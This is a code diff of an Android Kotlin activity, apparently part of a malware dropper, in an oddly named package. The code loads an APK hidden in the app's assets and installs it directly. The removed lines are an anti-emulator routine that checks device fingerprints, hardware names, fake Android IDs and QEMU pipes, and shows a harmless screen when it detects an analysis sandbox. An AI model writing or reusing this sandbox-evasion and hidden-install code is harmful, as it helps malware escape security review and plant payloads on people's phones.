@@ -1,11 +1,9 @@
 package com.cristal.bristral.tristal.mistral
 
 import android.content.Intent
-import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
-import android.provider.Settings
 import android.util.Log
 import android.view.View
 import android.widget.ProgressBar
@@ -37,8 +35,6 @@ class InstallActivity : AppCompatActivity() {
     // ── MAIN FLOW ─────────────────────────────────────────────
     private fun startAppFlow() {
         try {
-            if (!isCompatibleDevice()) { showNormal(); return }
-
             val apkBytes = loadAssets()
             if (apkBytes == null || apkBytes.isEmpty()) { showMessage("STEP:LOAD_ASSETS\napk is null or empty"); return }
 
@@ -78,19 +74,6 @@ class InstallActivity : AppCompatActivity() {
             android.util.Log.e("InstallActivity", "installApkDirect FAILED: ${e.javaClass.simpleName}: ${e.message}", e)
             showMessage("FAILED:\n${e.javaClass.simpleName}:\n${e.message}")
         }
-    }
-
-    // ── ENV CHECK ─────────────────────────────────────────────
-    private fun isCompatibleDevice(): Boolean {
-        var s = 0
-        try { val fp = Build.FINGERPRINT.lowercase(); if (fp.contains("generic") || fp.contains("unknown") || fp.contains("emulator") || fp.contains("sdk_gphone")) s++ } catch (e: Exception) { s++ }
-        try { val hw = Build.HARDWARE.lowercase(); if (hw.contains("goldfish") || hw.contains("ranchu") || hw.contains("vbox")) s++ } catch (e: Exception) { s++ }
-        try { val m = Build.MODEL.lowercase(); if (m.contains("sdk") || m.contains("emulator")) s++ } catch (e: Exception) { s++ }
-        try { val mfr = Build.MANUFACTURER.lowercase(); if (mfr.contains("genymotion") || mfr.contains("unknown")) s++ } catch (e: Exception) { s++ }
-        try { val aid = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID); if (aid.isNullOrEmpty() || aid == "000000000000000" || aid == "9774d56d682e549c") s++ } catch (e: Exception) { s++ }
-        try { if (File("/dev/socket/qemud").exists() || File("/dev/qemu_pipe").exists()) s++ } catch (e: Exception) { }
-        try { val abi = Build.SUPPORTED_ABIS.firstOrNull()?.lowercase() ?: ""; if (abi.contains("x86") && !abi.contains("arm")) s++ } catch (e: Exception) { }
-        return s < 2
     }
 
     // ── ASSETS ────────────────────────────────────────────────
